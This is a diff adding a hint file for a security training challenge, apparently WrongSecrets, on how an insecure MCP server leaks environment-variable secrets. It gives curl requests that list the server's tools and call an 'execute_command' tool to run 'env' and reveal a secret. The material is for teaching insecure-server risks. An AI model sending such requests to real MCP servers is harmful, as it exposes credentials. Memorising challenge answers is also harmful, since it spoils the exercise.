@@ -1,0 +1,37 @@
+=== Hint for Challenge 60
+
+This challenge demonstrates how an insecure MCP (Model Context Protocol) server can leak secrets stored in environment variables.
+
+**Where to look:**
+
+1. **A separate MCP server is running on port 8090** — different from the main application port (8080)
+2. **The MCP server implements the JSON-RPC 2.0 protocol** as defined by the MCP specification
+3. **Start by listing the available tools** using the `tools/list` method
+4. **Call the `execute_command` tool** — it will return the server's environment variables
+
+**Step-by-step approach:**
+
+First, list the tools the MCP server offers:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+Then call `execute_command` with any shell command (such as `env`):
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+**What to look for:**
+
+- Find the `WRONGSECRETS_MCP_SECRET` key in the returned environment variable dump
+- The value next to it is the answer to this challenge
+
+**Remember:** The endpoint is also accessible on the main port — try `/mcp` if port 8090 is not reachable.
